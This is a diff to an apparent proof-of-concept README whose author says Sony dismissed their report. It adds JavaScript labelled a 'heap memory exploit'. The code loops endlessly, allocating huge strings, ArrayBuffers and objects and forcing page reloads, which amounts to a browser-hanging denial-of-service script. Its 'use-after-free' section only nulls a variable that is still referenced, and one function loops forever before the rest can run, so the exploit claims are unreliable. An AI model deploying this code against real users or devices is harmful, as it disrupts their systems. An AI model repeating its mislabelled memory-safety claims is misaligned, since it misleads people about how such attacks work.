@@ -113,3 +113,113 @@ This PoC is for educational purposes only. The author is not responsible for any
 
 
 Sony I have reported this and got dismmised and I have provided enough proof plus with that unreleased PoC it's not my fault that even after 6months you didn't fix it I have gave you more then enough to fix this is to hopefully encourage you to fix it 
+
+## heap memory exploit code
+```
+function memmexh() {
+        while (true){
+        // Simulate allocation of an object
+        let obj = { data: "important data" };
+
+        // Reference to the object
+        let ref = obj;
+
+        // Simulate freeing the object
+        obj = null;
+
+        
+    }
+    }
+function ComplexOverflow() {
+    let largeString = "A".repeat(1000000); // 1 million A's
+    let bufferArray = [];
+    let nestedArray = [];
+    let obj = {};
+    let counter = 0;
+    let counterr = 0;
+
+    while (true) {
+
+        
+        // String concatenation
+        largeString += largeString;
+        if (largeString.length > 100000000) {
+            largeString = "A".repeat(1000000);
+        }
+
+        // Array buffer allocation
+        bufferArray.push(new ArrayBuffer(1000000));
+        if (bufferArray.length > 1000) {
+            bufferArray = [];
+        }
+
+        // Nested arrays
+        nestedArray.push([]);
+        if (nestedArray.length > 1000) {
+            nestedArray = [];
+        }
+
+ 
+        counterr++;
+        if (counterr >= 100) {
+            location.reload();
+        }
+        // Object property expansion
+        obj[counter] = "A".repeat(1000);
+        counter++;
+        if (counter > 10000000) {
+            obj = {};
+            counter = 0;
+        }
+    }
+}
+
+
+
+
+
+
+
+
+
+
+let MTestClassesArray = [];
+
+class MTestClass {
+    constructor() {}
+}
+
+const create_1000_objects = () => {
+    let counter = 0;
+    memmexh()
+    while (true) {
+        // Simulate allocation of an object
+        let obj = { data: "important data" };
+
+        // Reference to the object
+        let ref = obj;
+
+        console.log("Before freeing:", ref.data); // Output: important data
+
+        // Simulate freeing the object
+        obj = null;
+
+        try {
+            // Attempt to use the reference after the object is "freed"
+            console.log("After freeing:", ref.data); // This should fail in a true use-after-free
+        } catch (e) {
+            console.log("Error:", e.message); // Catch any errors
+        }
+    
+        counter++;
+        if (counter >= 500) {
+            location.reload();
+        }
+        for (let i = 0; i < 1000; i++) {
+            MTestClassesArray.push(new MTestClass());
+        }
+        const text = `Total ${MTestClassesArray.length} MTestClass objects created`;
+        document.getElementById('divMsg').innerHTML = text;
+    }
+}
+```
